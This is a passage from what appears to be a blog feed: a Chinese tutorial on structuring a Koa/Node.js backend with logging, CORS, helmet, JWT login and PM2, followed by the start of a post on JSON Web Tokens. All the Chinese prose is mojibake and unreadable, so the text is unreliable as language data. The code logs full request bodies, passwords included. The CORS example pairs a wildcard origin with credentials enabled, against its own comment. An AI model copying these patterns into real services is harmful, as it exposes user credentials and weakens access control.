¼å¼ï¼Œhttpè¯·æ±‚æ–¹æ³•ã€è¿”å›çŠ¶æ€ã€è¯·æ±‚urlã€IPåœ°å€ã€è¯·æ±‚æ—¶é—´ç­‰ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆå¥½çš„åˆ©ç”¨log4jsä¸­çš„é…ç½®ï¼Œæ¥æ‰“å°å‡ºè‡ªå®šä¹‰çš„æ—¥å¿—ã€‚å¯ä»¥ä»£æ›¿<code>console.log()</code>ä½¿ç”¨,åœ¨ä½¿ç”¨è¿™ä¸ªä¸­é—´ä»¶çš„æ—¶å€™ï¼Œå¿…é¡»æ”¾åœ¨ç¬¬ä¸€ä¸ªä¸­é—´ä»¶ï¼Œæ‰èƒ½ä¿è¯æ‰€ä»¥çš„è¯·æ±‚åŠæ“ä½œä¼šå…ˆç»è¿‡loggerè¿›è¡Œè®°å½•å†åˆ°ä¸‹ä¸€ä¸ªä¸­é—´ä»¶.</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<span class="hljs-keyword">const</span> log4js = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;log4js&#x27;</span>)<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../config&#x27;</span>)<span class="hljs-comment">// è¿™ä¸ªæ˜¯åˆ¤æ–­æ˜¯å¦æœ‰logsç›®å½•ï¼Œæ²¡æœ‰å°±æ–°å»ºï¼Œç”¨æ¥å­˜æ”¾æ—¥å¿—</span><span class="hljs-keyword">const</span> logsDir = path.parse(config.logPath).dir<span class="hljs-keyword">if</span> (!fs.existsSync(logsDir)) &#123;  fs.mkdirSync(logsDir)&#125;<span class="hljs-comment">// é…ç½®log4.js</span>log4js.configure(&#123;  appenders: &#123;    <span class="hljs-built_in">console</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;console&#x27;</span> &#125;,    dateFile: &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;dateFile&#x27;</span>, <span class="hljs-attr">filename</span>: config.logPath, <span class="hljs-attr">pattern</span>: <span class="hljs-string">&#x27;-yyyy-MM-dd&#x27;</span> &#125;  &#125;,  categories: &#123;    <span class="hljs-keyword">default</span>: &#123;      appenders: [<span class="hljs-string">&#x27;console&#x27;</span>, <span class="hljs-string">&#x27;dateFile&#x27;</span>],      level: <span class="hljs-string">&#x27;info&#x27;</span>    &#125;  &#125;&#125;)<span class="hljs-keyword">const</span> logger = log4js.getLogger(<span class="hljs-string">&#x27;[Default]&#x27;</span>)<span class="hljs-comment">// loggerä¸­é—´ä»¶</span><span class="hljs-keyword">const</span> loggerMiddleware = <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<span class="hljs-comment">// è¯·æ±‚å¼€å§‹æ—¶é—´</span>  <span class="hljs-keyword">const</span> start = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()  <span class="hljs-keyword">await</span> next()  <span class="hljs-comment">// ç»“æŸæ—¶é—´</span>  <span class="hljs-keyword">const</span> ms = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>() - start    <span class="hljs-comment">// æ‰“å°å‡ºè¯·æ±‚ç›¸å…³å‚æ•°</span>  <span class="hljs-keyword">const</span> remoteAddress = ctx.headers[<span class="hljs-string">&#x27;x-forwarded-for&#x27;</span>] || ctx.ip || ctx.ips ||    (ctx.socket &amp;&amp; (ctx.socket.remoteAddress || (ctx.socket.socket &amp;&amp; ctx.socket.socket.remoteAddress)))  <span class="hljs-keyword">let</span> logText = <span class="hljs-string">`<span class="hljs-subst">$&#123;ctx.method&#125;</span> <span class="hljs-subst">$&#123;ctx.status&#125;</span> <span class="hljs-subst">$&#123;ctx.url&#125;</span> è¯·æ±‚å‚æ•°ï¼š <span class="hljs-subst">$&#123;<span class="hljs-built_in">JSON</span>.stringify(ctx.request.body)&#125;</span> å“åº”å‚æ•°ï¼š <span class="hljs-subst">$&#123;<span class="hljs-built_in">JSON</span>.stringify(ctx.body)&#125;</span> - <span class="hljs-subst">$&#123;remoteAddress&#125;</span> - <span class="hljs-subst">$&#123;ms&#125;</span>ms`</span>  logger.info(logText)&#125;<span class="hljs-built_in">module</span>.exports = &#123;  logger,  loggerMiddleware&#125;</code></pre><h5 id="response-js"><a class="header-anchor" href="#response-js">ğŸ­</a>response.js</h5><p>è¿™ä¸ªä¸­é—´ä»¶ä¸»è¦æ˜¯ç”¨æ¥å¯¹è¿”å›å‰ç«¯çš„å“åº”è¿›è¡Œå¤„ç†ï¼ŒåŸºç¡€çš„koaæ¨¡æ¿ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>ctx.body</code>è¿›è¡Œè¿”å›å‰ç«¯ï¼Œä½†æ˜¯æœ‰äº›ä¸œè¥¿ç»å¸¸é‡å¤å†™ï¼Œè¿›è¡Œå°è£…è¾ƒæ–¹ä¾¿ã€‚</p><h5 id="cors-js"><a class="header-anchor" href="#cors-js">ğŸ­</a>cors.js</h5><p>åœ¨å‰åç«¯æ¥å£è¯·æ±‚ä¸­ï¼Œç”±äºæµè§ˆå™¨çš„é™åˆ¶ï¼Œä¼šå‡ºç°è·¨åŸŸçš„æƒ…å†µã€‚å¸¸ç”¨çš„è·¨åŸŸæ–¹æ¡ˆæœ‰ï¼š</p><ul><li>JSONPè·¨åŸŸ</li><li>nginxåå‘ä»£ç†</li><li>æœåŠ¡å™¨ç«¯ä¿®æ”¹heade</li><li>document.domain</li><li><a href="http://window.name">window.name</a></li><li>postMessage</li><li>åå°é…ç½®è¿è¡Œè·¨åŸŸ</li></ul><p>corså…·ä½“å®ç°è·¨åŸŸ</p><pre><code class="hljs awk">app.use(async (ctx, <span class="hljs-keyword">next</span>) =&gt; &#123;    <span class="hljs-regexp">//</span> å…è®¸æ¥è‡ªæ‰€æœ‰åŸŸåè¯·æ±‚    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>);    <span class="hljs-regexp">//</span> è¿™æ ·å°±èƒ½åªå…è®¸ http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span> è¿™ä¸ªåŸŸåçš„è¯·æ±‚äº†    <span class="hljs-regexp">//</span> ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;http://localhost:8080&quot;</span>);     <span class="hljs-regexp">//</span> è®¾ç½®æ‰€å…è®¸çš„HTTPè¯·æ±‚æ–¹æ³•    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="hljs-string">&quot;OPTIONS, GET, PUT, POST, DELETE&quot;</span>);    <span class="hljs-regexp">//</span> å­—æ®µæ˜¯å¿…éœ€çš„ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰å¤´ä¿¡æ¯å­—æ®µ.    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="hljs-string">&quot;x-requested-with, accept, origin, content-type&quot;</span>);    <span class="hljs-regexp">//</span> æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä»¥åï¼Œæ£€æŸ¥äº†Originã€Access-Control-Request-Methodå’ŒAccess-Control-Request-Headerså­—æ®µä»¥åï¼Œç¡®è®¤å…è®¸è·¨æºè¯·æ±‚ï¼Œå°±å¯ä»¥åšå‡ºå›åº”ã€‚    <span class="hljs-regexp">//</span> Content-Typeè¡¨ç¤ºå…·ä½“è¯·æ±‚ä¸­çš„åª’ä½“ç±»å‹ä¿¡æ¯    ctx.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>);    <span class="hljs-regexp">//</span> è¯¥å­—æ®µå¯é€‰ã€‚å®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€Cookieã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒCookieä¸åŒ…æ‹¬åœ¨CORSè¯·æ±‚ä¹‹ä¸­ã€‚    <span class="hljs-regexp">//</span> å½“è®¾ç½®æˆå…è®¸è¯·æ±‚æºå¸¦cookieæ—¶ï¼Œéœ€è¦ä¿è¯<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>æ˜¯æœåŠ¡å™¨æœ‰çš„åŸŸåï¼Œè€Œä¸èƒ½æ˜¯<span class="hljs-string">&quot;*&quot;</span>;    ctx.set(<span class="hljs-string">&quot;Access-Control-Allow-Credentials&quot;</span>, true);    <span class="hljs-regexp">//</span> è¯¥å­—æ®µå¯é€‰ï¼Œç”¨æ¥æŒ‡å®šæœ¬æ¬¡é¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼Œå•ä½ä¸ºç§’ã€‚    <span class="hljs-regexp">//</span> å½“è¯·æ±‚æ–¹æ³•æ˜¯PUTæˆ–DELETEç­‰ç‰¹æ®Šæ–¹æ³•æˆ–è€…Content-Typeå­—æ®µçš„ç±»å‹æ˜¯application/jsonæ—¶ï¼ŒæœåŠ¡å™¨ä¼šæå‰å‘é€ä¸€æ¬¡è¯·æ±‚è¿›è¡ŒéªŒè¯    <span class="hljs-regexp">//</span> ä¸‹é¢çš„çš„è®¾ç½®åªæœ¬æ¬¡éªŒè¯çš„æœ‰æ•ˆæ—¶é—´ï¼Œå³åœ¨è¯¥æ—¶é—´æ®µå†…æœåŠ¡ç«¯å¯ä»¥ä¸ç”¨è¿›è¡ŒéªŒè¯    ctx.set(<span class="hljs-string">&quot;Access-Control-Max-Age&quot;</span>, <span class="hljs-number">300</span>);    /*    CORSè¯·æ±‚æ—¶ï¼ŒXMLHttpRequestå¯¹è±¡çš„getResponseHeader()æ–¹æ³•åªèƒ½æ‹¿åˆ°<span class="hljs-number">6</span>ä¸ªåŸºæœ¬å­—æ®µï¼š        Cache-Controlã€        Content-Languageã€        Content-Typeã€        Expiresã€        Last-Modifiedã€        Pragmaã€‚    */    <span class="hljs-regexp">//</span> éœ€è¦è·å–å…¶ä»–å­—æ®µæ—¶ï¼Œä½¿ç”¨Access-Control-Expose-Headersï¼Œ    <span class="hljs-regexp">//</span> getResponseHeader(<span class="hljs-string">&#x27;myData&#x27;</span>)å¯ä»¥è¿”å›æˆ‘ä»¬æ‰€éœ€çš„å€¼    <span class="hljs-regexp">//</span>https:<span class="hljs-regexp">//</span>www.rails365.net<span class="hljs-regexp">/articles/</span>cors-jin-jie-expose-headers-wu    ctx.set(<span class="hljs-string">&quot;Access-Control-Expose-Headers&quot;</span>, <span class="hljs-string">&quot;myData&quot;</span>);        await <span class="hljs-keyword">next</span>();&#125;)</code></pre><h5 id="koa-helmet-ä¸­é—´ä»¶"><a class="header-anchor" href="#koa-helmet-ä¸­é—´ä»¶">ğŸ­</a>koa-helmet ä¸­é—´ä»¶</h5><p>koa-helmet å¯ä»¥å¸®åŠ© app æŠµå¾¡ä¸€äº›æ¯”è¾ƒå¸¸è§çš„å®‰å…¨ web å®‰å…¨éšæ‚£ï¼Œå®ƒå°† 9 ä¸ªå®‰å…¨ä¸­é—´ä»¶é›†ä¸­åˆ°äº†ä¸€èµ·ï¼Œåšäº†åˆå¹¶,å¤§éƒ¨åˆ†éƒ½æ˜¯å¯¹äº http header çš„æ“ä½œã€‚é»˜è®¤å¼€å¯åŠŸèƒ½ï¼š</p><p><img src="/2021/07/19/koa/5.png" alt="5"></p><p>å®‰è£…åéœ€åœ¨app.jsè¿›è¡Œå¼•ç”¨ï¼š</p><pre><code class="hljs isbl"><span class="hljs-variable">const</span> <span class="hljs-variable">helmet</span> = <span class="hljs-function"><span class="hljs-title">require</span>(<span class="hljs-string">&quot;koa-helmet&quot;</span>)</span><span class="hljs-comment">// Helmet</span><span class="hljs-variable">app.use</span>(<span class="hljs-function"><span class="hljs-title">helmet</span>())</span></code></pre><h5 id="è·¯ç”±é…ç½®"><a class="header-anchor" href="#è·¯ç”±é…ç½®">ğŸ­</a>è·¯ç”±é…ç½®</h5><ul><li><code>private.js</code>ï¼šè¯¥æ–‡ä»¶ä¸‹çš„è·¯ç”±æ˜¯éœ€è¦é€šè¿‡jwtéªŒè¯çš„ï¼Œæ‰èƒ½è¿›è¡Œè®¿é—®ã€‚</li><li><code>public.js</code>ï¼šè¯¥æ–‡ä»¶ä¸ä¸Šé¢ç›¸åï¼Œä¸»è¦ç”¨æ¥ä¸è¿›è¡Œç™»å½•çš„æ ¡éªŒï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ç™»å½•ã€æ³¨å†Œç­‰ä¸éœ€è¦éªŒè¯çš„æ¥å£ã€‚</li></ul><h5 id="controllersæ–‡ä»¶"><a class="header-anchor" href="#controllersæ–‡ä»¶">ğŸ­</a>controllersæ–‡ä»¶</h5><p>ä¸ºäº†è®©æ•´ä¸ªé¡¹ç›®æ›´ä¸ºæ¨¡å—åŒ–ï¼Œè¯¥ç›®å½•ä¸‹ä¸»è¦æ˜¯å¤„ç†å¯¹åº”çš„è·¯ç”±çš„å›è°ƒå‡½æ•°ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¸ä¼šåœ¨routeræ–‡ä»¶ä¸­å»ä¸šåŠ¡é€»è¾‘æ“ä½œç­‰æ­¥éª¤ï¼Œè¿™é‡Œé‡‡ç”¨ routes å’Œ controller åˆ†å¼€ï¼Œåœ¨æ–¹ä¾¿ä»£ç çš„æŸ¥çœ‹åŒæ—¶ï¼Œä¹Ÿæ–¹ä¾¿ä»£ç çš„ç»´æŠ¤å’Œå¼€å‘ã€‚</p><p>controllerä¸‹çš„index.jsæ–‡ä»¶å°†å…¶ä»–æ–‡ä»¶å¯¼å‡ºç»Ÿä¸€åˆ°indexæš´éœ²å‡ºå»ï¼š</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> files = fs.readdirSync(__dirname).filter(<span class="hljs-function"><span class="hljs-params">file</span> =&gt;</span> file !== <span class="hljs-string">&#x27;index.js&#x27;</span>)<span class="hljs-keyword">const</span> controllers = &#123;&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> file <span class="hljs-keyword">of</span> files) &#123;  <span class="hljs-keyword">if</span> (file.toLowerCase().endsWith(<span class="hljs-string">&#x27;js&#x27;</span>)) &#123;    <span class="hljs-keyword">const</span> controller = <span class="hljs-built_in">require</span>(<span class="hljs-string">`./<span class="hljs-subst">$&#123;file&#125;</span>`</span>)    controllers[<span class="hljs-string">`<span class="hljs-subst">$&#123;file.replace(<span class="hljs-regexp">/\.js/</span>, <span class="hljs-string">&#x27;&#x27;</span>)&#125;</span>`</span>] = controller  &#125;&#125;<span class="hljs-built_in">module</span>.exports = controllers</code></pre><p>controllerä¸‹çš„user.jsæ–‡ä»¶æ˜¯æˆ‘ä»¬å¤„ç†ä¸šåŠ¡çš„ï¼Œå¯æŒ‰éœ€æ·»åŠ </p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../config&#x27;</span>)<span class="hljs-keyword">const</span> userServices = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../services&#x27;</span>).user<span class="hljs-keyword">const</span> &#123; InvalidQueryError &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../lib/error&#x27;</span>)<span class="hljs-keyword">const</span> login = &#123;&#125;login.login = <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;    <span class="hljs-built_in">console</span>.log(userServices)    <span class="hljs-keyword">const</span> &#123;userName, password&#125; = ctx.request.body    <span class="hljs-keyword">if</span> (!userName || !password) &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidQueryError()    &#125;    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> userServices.login(&#123;        userName: userName,        password: password    &#125;)    <span class="hljs-keyword">if</span> (!user) &#123;        ctx.result = <span class="hljs-string">&#x27;&#x27;</span>        ctx.msg = <span class="hljs-string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;</span>    &#125; <span class="hljs-keyword">else</span> &#123;        ctx.result = jwt.sign(&#123;            data: user._id,            <span class="hljs-comment">// è®¾ç½® token è¿‡æœŸæ—¶é—´</span>            exp: <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Date</span>.now() / <span class="hljs-number">1000</span>) + (<span class="hljs-number">60</span> * <span class="hljs-number">60</span>), <span class="hljs-comment">// 60 seconds * 60 minutes = 1 hour</span>        &#125;, config.secret)    &#125;    <span class="hljs-keyword">return</span> next()&#125;<span class="hljs-built_in">module</span>.exports = login</code></pre><h4 id="modelsæ–‡ä»¶"><a class="header-anchor" href="#modelsæ–‡ä»¶">ğŸ­</a>modelsæ–‡ä»¶</h4><p>è¯¥é¡¹ç›®ä¸­æ˜¯ä½¿ç”¨<code>mongoose</code>å¯¹<code>mongoDB</code>å¯¹æ•°æ®åº“è¿›è¡Œæ“ä½œ,<code>mongoose</code>çš„é…ç½®åŒ…æ‹¬ä¸‰å¤§éƒ¨åˆ†ï¼š<code>connect</code>ã€<code>Models</code>å’Œ<code>Schema</code></p><p><code>connect</code>ï¼šç”¨äºåˆ›å»ºæ•°æ®åº“è¿æ¥åŠç›‘å¬</p><p><code>Schema</code>ï¼šSchemaä¸»è¦ç”¨äºå®šä¹‰MongoDBä¸­é›†åˆCollectioné‡Œæ–‡æ¡£documentçš„ç»“æ„,å¯ä»¥ç†è§£ä¸ºmongooseå¯¹è¡¨ç»“æ„çš„å®šä¹‰(ä¸ä»…ä»…å¯ä»¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„å’Œå±æ€§ï¼Œè¿˜å¯ä»¥å®šä¹‰æ–‡æ¡£çš„å®ä¾‹æ–¹æ³•ã€é™æ€æ¨¡å‹æ–¹æ³•ã€å¤åˆç´¢å¼•ç­‰)ï¼Œæ¯ä¸ªschemaä¼šæ˜ å°„åˆ°mongodbä¸­çš„ä¸€ä¸ªcollectionï¼Œschemaä¸å…·å¤‡æ“ä½œæ•°æ®åº“çš„èƒ½åŠ›ï¼Œç®€å•ç†è§£æ˜¯å¯¹å­—æ®µçš„å®šä¹‰ï¼Œæ“ä½œæ•°æ®åº“å¿…é¡»æŒ‰ç…§è¿™äº›å­—æ®µè¿›è¡Œï¼Œå¦åœ¨ä¼šæŠ¥é”™ã€‚</p><p><code>Models</code>ï¼š ã€€Modelæ˜¯ç”±Schemaç¼–è¯‘è€Œæˆçš„å‡æƒ³ï¼ˆfancyï¼‰æ„é€ å™¨ï¼Œå…·æœ‰æŠ½è±¡å±æ€§å’Œè¡Œä¸ºã€‚Modelçš„æ¯ä¸€ä¸ªå®ä¾‹ï¼ˆinstanceï¼‰å°±æ˜¯ä¸€ä¸ªdocumentï¼Œdocumentå¯ä»¥ä¿å­˜åˆ°æ•°æ®åº“å’Œå¯¹æ•°æ®åº“è¿›è¡Œæ“ä½œã€‚ç®€å•è¯´å°±æ˜¯modelæ˜¯ç”±schemaç”Ÿæˆçš„æ¨¡å‹ï¼Œå¯ä»¥å¯¹æ•°æ®åº“çš„æ“ä½œã€‚</p><h4 id="package-jsonæ–‡ä»¶"><a class="header-anchor" href="#package-jsonæ–‡ä»¶">ğŸ­</a>package.jsonæ–‡ä»¶</h4><p>æ¯ä¸ªNodejsé¡¹ç›®çš„æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸€èˆ¬éƒ½ä¼šæœ‰ä¸€ä¸ªpackage.jsonæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å¯ä»¥ç”±npm initç”Ÿæˆï¼Œå®šä¹‰äº†é¡¹ç›®æ‰€éœ€è¦çš„å„ç§æ¨¡å—ï¼Œä»¥åŠé¡¹ç›®çš„é…ç½®ä¿¡æ¯ï¼ˆæ¯”å¦‚åç§°ã€ç‰ˆæœ¬ã€è®¸å¯è¯ç­‰å…ƒæ•°æ®)ã€‚ package.jsonæ–‡ä»¶å†…éƒ¨å°±æ˜¯ä¸€ä¸ªJSONå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„æ¯ä¸€ä¸ªæˆå‘˜å°±æ˜¯å½“å‰é¡¹ç›®çš„ä¸€é¡¹è®¾ç½®ã€‚æˆ‘ä»¬ä¹Ÿå¯åœ¨é‡Œé¢é…ç½®æˆ‘ä»¬çš„<code>npm run XXX</code>çš„å‘½ä»¤ã€‚</p><p>æœ¬é¡¹ç›®çš„package.jsonï¼š</p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;koa-template&quot;</span>,  <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.1.0&quot;</span>,  <span class="hljs-attr">&quot;author&quot;</span>: <span class="hljs-string">&quot;bayi&quot;</span>,  <span class="hljs-attr">&quot;private&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;scripts&quot;</span>: &#123;    <span class="hljs-attr">&quot;start&quot;</span>: <span class="hljs-string">&quot;node ./bin/www&quot;</span>,    <span class="hljs-attr">&quot;dev&quot;</span>: <span class="hljs-string">&quot;pm2 start ecosystem.config.js --env dev&quot;</span>,    <span class="hljs-attr">&quot;test&quot;</span>: <span class="hljs-string">&quot;pm2 start ecosystem.config.js --env test&quot;</span>,    <span class="hljs-attr">&quot;pro&quot;</span>: <span class="hljs-string">&quot;pm2 start ecosystem.config.js --env pro&quot;</span>,    <span class="hljs-attr">&quot;logs&quot;</span>: <span class="hljs-string">&quot;pm2 logs&quot;</span>,    <span class="hljs-attr">&quot;stop&quot;</span>: <span class="hljs-string">&quot;pm2 stop ecosystem.config.js&quot;</span>  &#125;,  <span class="hljs-attr">&quot;dependencies&quot;</span>: &#123;    <span class="hljs-attr">&quot;koa&quot;</span>: <span class="hljs-string">&quot;^2.6.2&quot;</span>,    <span class="hljs-attr">&quot;koa-bodyparser&quot;</span>: <span class="hljs-string">&quot;^4.2.1&quot;</span>,    <span class="hljs-attr">&quot;koa-helmet&quot;</span>: <span class="hljs-string">&quot;^4.1.0&quot;</span>,    <span class="hljs-attr">&quot;koa-jwt&quot;</span>: <span class="hljs-string">&quot;^3.5.1&quot;</span>,    <span class="hljs-attr">&quot;koa-router&quot;</span>: <span class="hljs-string">&quot;^7.4.0&quot;</span>,    <span class="hljs-attr">&quot;koa-static-cache&quot;</span>: <span class="hljs-string">&quot;^5.1.2&quot;</span>,    <span class="hljs-attr">&quot;koa2-cors&quot;</span>: <span class="hljs-string">&quot;^2.0.6&quot;</span>,    <span class="hljs-attr">&quot;log4js&quot;</span>: <span class="hljs-string">&quot;^3.0.6&quot;</span>,    <span class="hljs-attr">&quot;mongoose&quot;</span>: <span class="hljs-string">&quot;^5.5.5&quot;</span>  &#125;&#125;</code></pre><h4 id="config-jsæ–‡ä»¶"><a class="header-anchor" href="#config-jsæ–‡ä»¶">ğŸ­</a>config.jsæ–‡ä»¶</h4><p>æ ¹ç›®å½•æ–°å»ºè¯¥æ–‡ä»¶ä¸»è¦ç”¨æ¥å­˜æ”¾å…¨å±€çš„é…ç½®ï¼Œå¦‚æœä¸€ä¸ªé¡¹ç›®ä¸­æ²¡æœ‰å…¨å±€çš„é…ç½®ï¼Œé‚£ä¹ˆä¸€ä¸ªåœ°æ–¹æ”¹åŠ¨ç‰µåŠ¨çš„å…¶ä»–åœ°æ–¹å¾ˆå¤šï¼Œè¿™æ ·å·¥ä½œæ•ˆç‡å¾ˆä½ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šæŠŠå¸¸ç”¨çš„éƒ½æ”¾åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šæ•°æ®åº“å‚æ•°ï¼Œç«¯å£ï¼Œå¯†é’¥ï¼Œå…¨å±€å˜é‡ç­‰ã€‚</p><h4 id="servicesæ–‡ä»¶"><a class="header-anchor" href="#servicesæ–‡ä»¶">ğŸ­</a>servicesæ–‡ä»¶</h4><p>è¿™ä¸ªæ–‡ä»¶ä¸»è¦æ˜¯ç”¨æ¥å¤„ç†æ•°æ®åº“ä»¥åŠæœåŠ¡ç­‰é€»è¾‘ï¼Œè¯¥æ–‡ä»¶å¤¹ä¸‹index.jsæ–‡ä»¶å†…å®¹ä¸controllersæ–‡ä»¶ä¸­çš„ç”¨æ³•ä¸€è‡´ã€‚</p><h4 id="PM2é…ç½®"><a class="header-anchor" href="#PM2é…ç½®">ğŸ­</a>PM2é…ç½®</h4><p>PM2æ˜¯å¯ä»¥ç”¨äºç”Ÿäº§ç¯å¢ƒçš„Nodejsçš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œå¹¶ä¸”å®ƒå†…ç½®ä¸€ä¸ªè´Ÿè½½å‡è¡¡ã€‚å®ƒå¯ä»¥ä¿è¯æœåŠ¡ä¸ä¼šä¸­æ–­ä¸€ç›´åœ¨çº¿ï¼Œå¹¶ä¸”æä¾›0ç§’reloadåŠŸèƒ½ï¼Œè¿˜æœ‰å…¶ä»–ä¸€ç³»åˆ—è¿›ç¨‹ç®¡ç†ã€ç›‘æ§åŠŸèƒ½ã€‚</p><h4 id="libæ–‡ä»¶"><a class="header-anchor" href="#libæ–‡ä»¶">ğŸ­</a>libæ–‡ä»¶</h4><ul><li><code>error.js</code>ï¼šä¸»è¦æ˜¯åœ¨ä¸­é—´ä»¶ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œç”±äºå‰é¢æˆ‘ä»¬å·²ç»åŠ å…¥äº†å¼‚å¸¸æ•è·çš„ä¸­é—´ä»¶ï¼Œåœ¨ä¸­é—´ä»¶æ“ä½œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæœ‰é”™è¯¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬é…ç½®æ‰€ç”¨çš„ã€‚</li><li><code>mongoDB.js</code>ï¼šå¯¹mongoDBçš„é“¾æ¥é…ç½®ã€‚</li></ul><h4 id="binæ–‡ä»¶"><a class="header-anchor" href="#binæ–‡ä»¶">ğŸ­</a>binæ–‡ä»¶</h4><p>è¯¥æ–‡ä»¶æ˜¯ç”¨æ¥éƒ¨ç½²çš„æ—¶å€™å¯ä»¥å¯åŠ¨æˆ‘ä»¬ä¸€æ•´ä¸ªåç«¯ç¨‹åºï¼Œä¹Ÿå°±æ˜¯å‰ç«¯ä¸­çš„é›†æˆçš„è¿è¡Œç¯å¢ƒã€‚æˆ‘ä»¬çš„è¿è¡Œã€å…³é—­ã€é‡å¯éƒ½åœ¨è¿™æ–‡ä»¶è¿›è¡Œå³å¯ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://www.jianshu.com/p/47259f48c153">https://www.jianshu.com/p/47259f48c153</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JSON Web Token</title>
    <link href="/2021/07/19/11/"/>
    <url>/2021/07/19/11/</url>
    
    <content type="html"><![CDATA[<p>JSON Web Tokenï¼ˆç¼©å†™ JWTï¼‰æ˜¯ç›®å‰æœ€æµè¡Œçš„è·¨åŸŸè®¤è¯è§£å†³æ–¹æ¡ˆï¼Œç”¨äºä½œä¸ºJSONå¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚</p><h3 id="è·¨åŸŸè®¤è¯"><a class="header-anchor" href="#è·¨åŸŸè®¤è¯">ğŸ­</a>è·¨åŸŸè®¤è¯</h3><p>ç”¨æˆ·è®¤è¯æµç¨‹(ä¹‹å‰CSRFå°±è®²è¿‡äº†)</p><blockquote><p>1ã€ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>2ã€æœåŠ¡å™¨éªŒè¯é€šè¿‡åï¼Œåœ¨å½“å‰å¯¹è¯ï¼ˆsessionï¼‰é‡Œé¢ä¿å­˜ç›¸å…³æ•°æ®ï¼Œæ¯”å¦‚ç”¨æˆ·è§’è‰²ã€ç™»å½•æ—¶é—´ç­‰ç­‰ã€‚</p><p>3ã€æœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›ä¸€ä¸ª session_idï¼Œå†™å…¥ç”¨æˆ·çš„ Cookieã€‚</p><p>4ã€ç”¨æˆ·éšåçš„æ¯ä¸€æ¬¡è¯·æ±‚ï¼Œéƒ½ä¼šé€šè¿‡ Cookieï¼Œå°† session_id ä¼ å›æœåŠ¡å™¨ã€‚</p><p>5ã€æœåŠ¡å™¨æ”¶åˆ° 